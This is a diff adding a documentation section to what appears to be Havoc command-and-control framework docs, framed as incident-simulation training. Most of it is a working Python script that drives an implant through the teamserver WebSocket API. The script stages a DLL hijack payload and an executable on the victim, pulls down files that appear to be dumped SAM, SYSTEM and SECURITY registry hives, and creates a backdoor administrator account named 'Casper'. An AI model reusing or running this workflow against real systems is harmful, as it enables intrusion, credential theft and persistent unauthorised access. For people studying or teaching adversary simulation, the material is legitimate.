@@ -101,6 +101,199 @@ These two tasks create the `Casper` account with the provided password and add i
 
 Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.
 
+## Automating sequential workflows
+
+The interactive REPL is convenient for ad-hoc operations, but incident simulations usually need a deterministic workflow. The headless protocol already exposes everything you need to orchestrate a queue of tasks, wait for their completion, and persist the output. Build an automation script around the same WebSocket feed that the CLI consumes:
+
+1. Connect to `wss://<host>:<port>/havoc/` and authenticate with the SHA3-256 password hash exactly as the headless client does. 【F:teamserver/cmd/headless/headless.go†L31-L115】【F:teamserver/cmd/server/teamserver.go†L560-L720】
+2. Subscribe to session events and keep an in-memory map of pending tasks. The server broadcasts every agent result through `packager.Type.Session.Output` together with the numeric `CommandID` you supplied earlier. 【F:teamserver/cmd/headless/headless.go†L360-L640】【F:teamserver/pkg/events/demons.go†L54-L103】
+3. For file downloads, watch for callback dictionaries with `MiscType == "download"`. The service layer attaches the file content to `MiscData` (base64) and the original file name/size to `MiscData2`. 【F:teamserver/pkg/service/service.go†L360-L412】
+4. When each task finishes, decode the `Output` payload, write it to disk if needed, and only then queue the next command so the agent processes them one after another.
+
+The following Python script demonstrates a simple workflow runner. It logs in, waits for an agent, and then executes the commands from the earlier example sequentially. PowerShell output is written to disk before the next task is scheduled, downloads are persisted from the callback payload, and each step blocks until its corresponding `Session.Output` event appears.
+
+```python
+#!/usr/bin/env python3
+import asyncio
+import base64
+import hashlib
+import json
+import os
+import websockets
+
+TEAMSERVER = "wss://127.0.0.1:40056/havoc/"
+USERNAME = "operator"
+PASSWORD = "super-secret"
+AGENT_ID = "AGT0001"
+
+# Helper to mirror the GUI's task structure
+def make_task(command_id, **fields):
+    payload = {
+        "Head": {
+            "Event": 5,               # packager.Type.Session.Type
+            "User": USERNAME,
+        },
+        "Body": {
+            "SubEvent": 2,           # packager.Type.Session.Input
+            "Info": {
+                "DemonID": AGENT_ID,
+                "CommandID": str(command_id),
+            } | fields,
+        },
+    }
+    if "TaskID" not in payload["Body"]["Info"]:
+        payload["Body"]["Info"]["TaskID"] = os.urandom(4).hex()
+    return payload
+
+
+WORKFLOW = [
+    {
+        "name": "machine_path",
+        "task": make_task(
+            0x1010,
+            CommandLine="powershell",
+            ProcCommand="4",
+            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+            + base64.b64encode(b"[System.Environment]::GetEnvironmentVariable('Path','Machine')").decode(),
+        ),
+        "outfile": "machine-path.txt",
+    },
+    {
+        "name": "user_path",
+        "task": make_task(
+            0x1010,
+            CommandLine="powershell",
+            ProcCommand="4",
+            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+            + base64.b64encode(b"[System.Environment]::GetEnvironmentVariable('Path','User')").decode(),
+        ),
+        "outfile": "user-path.txt",
+    },
+    {
+        "name": "upload_wpts",
+        "task": make_task(
+            15,
+            SubCommand="upload",
+            Arguments=base64.b64encode(b"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\WptsExtensions.dll").decode(),
+            File=base64.b64encode(open("/home/kali/WptsExtensions.dll", "rb").read()).decode(),
+        ),
+    },
+    {
+        "name": "upload_summon",
+        "task": make_task(
+            15,
+            SubCommand="upload",
+            Arguments=base64.b64encode(b"C:\\Users\\Alice Malice\\AppData\\Local\\Temp\\summon.exe").decode(),
+            File=base64.b64encode(open("/home/kali/summon.exe", "rb").read()).decode(),
+        ),
+    },
+    {
+        "name": "stop_computer",
+        "task": make_task(
+            0x1010,
+            CommandLine="powershell",
+            ProcCommand="4",
+            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+            + base64.b64encode(b"Stop-Computer").decode(),
+        ),
+    },
+    {
+        "name": "download_samantha",
+        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\samantha.txt").decode()),
+        "download": "C:/samantha.txt",
+    },
+    {
+        "name": "download_systemic",
+        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\systemic.txt").decode()),
+        "download": "C:/systemic.txt",
+    },
+    {
+        "name": "download_security",
+        "task": make_task(15, SubCommand="download", Arguments=base64.b64encode(b"C:\\security.txt").decode()),
+        "download": "C:/security.txt",
+    },
+    {
+        "name": "add_user",
+        "task": make_task(
+            0x1010,
+            CommandLine="powershell",
+            ProcCommand="4",
+            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+            + base64.b64encode(b"net user Casper IamAGhost12345!!! /add").decode(),
+        ),
+    },
+    {
+        "name": "add_to_admins",
+        "task": make_task(
+            0x1010,
+            CommandLine="powershell",
+            ProcCommand="4",
+            Args="0;FALSE;TRUE;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe;"
+            + base64.b64encode(b"net localgroup Administrators Casper /add").decode(),
+        ),
+    },
+]
+
+
+async def authenticate(ws):
+    pwd_hash = hashlib.sha3_256(PASSWORD.encode()).hexdigest()
+    request = {
+        "Head": {
+            "Event": 1,  # packager.Type.InitConnection.Type
+            "User": USERNAME,
+        },
+        "Body": {
+            "SubEvent": 1,  # OAuthRequest
+            "Info": {"User": USERNAME, "Password": pwd_hash},
+        },
+    }
+    await ws.send(json.dumps(request))
+
+
+async def workflow_runner():
+    async with websockets.connect(TEAMSERVER, ssl=not TEAMSERVER.startswith("ws://")) as ws:
+        await authenticate(ws)
+        pending = list(WORKFLOW)
+        downloads = {}
+
+        while pending:
+            current = pending[0]
+            await ws.send(json.dumps(current["task"]))
+
+            while True:
+                message = json.loads(await ws.recv())
+                head, body = message.get("Head", {}), message.get("Body", {})
+
+                if head.get("Event") != 5 or body.get("SubEvent") != 3:
+                    continue  # ignore non Session.Output traffic
+
+                info = body.get("Info", {})
+                if info.get("DemonID") != AGENT_ID:
+                    continue
+
+                output = base64.b64decode(info.get("Output", "")).decode(errors="ignore")
+                if current.get("outfile"):
+                    with open(current["outfile"], "w", encoding="utf-8") as f:
+                        f.write(output)
+
+                if current.get("download"):
+                    callback = json.loads(output)
+                    if callback.get("MiscType") == "download":
+                        content = base64.b64decode(callback["MiscData"])
+                        name = base64.b64decode(callback["MiscData2"].split(";")[0]).decode()
+                        with open(os.path.basename(name), "wb") as f:
+                            f.write(content)
+                break
+
+            pending.pop(0)
+
+
+if __name__ == "__main__":
+    asyncio.run(workflow_runner())
+```
+
+Adapt the `WORKFLOW` list to add delays, conditional logic, or additional modules. Because the loop waits for each `Session.Output` package before moving forward, the agent never has multiple long-running tasks queued at the same time. The pattern also keeps console transcripts and downloaded artefacts in local files so they can be handed to trainees alongside the Havoc logs.
+
 ## 1. Understand the Transport
 
 * The Qt client connects to the teamserver over a WebSocket endpoint at `wss://<host>:<port>/havoc/` and ignores TLS validation errors. The same URI and TLS behaviour must be reproduced by the headless client. 【F:client/src/Havoc/Connector.cc†L10-L44】
